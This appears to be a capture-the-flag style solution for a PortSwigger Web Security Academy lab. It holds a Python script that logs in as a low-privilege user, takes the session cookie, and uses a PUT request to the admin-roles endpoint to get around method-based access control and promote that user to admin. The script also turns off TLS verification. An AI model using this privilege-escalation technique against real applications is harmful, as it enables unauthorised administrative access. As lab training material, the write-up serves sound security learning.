# Lab: Method-based access control can be circumvented

Link to lab: https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented

## Solution

```python
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup


url = 'https://0aec003503dd6fe9c7c42b56009a00fc.web-security-academy.net/'

session = requests.Session()

response = session.get(
    url + 'login',
    verify=False,
)

data = {
    'username': 'wiener',
    'password': 'peter',
}

response = session.post(
    url + 'login',
    data=data,
    verify=False,
    allow_redirects=False
)

session = response.headers['Set-Cookie'].split(';')[0].split('=')[1]


cookies = {
    'session': session
}

data = {
    "username":"wiener",
    "action":"upgrade"
}

response = requests.put(
    url + 'admin-roles',
    cookies=cookies,
    data=data,
    verify=False,
)

print(response.text)
```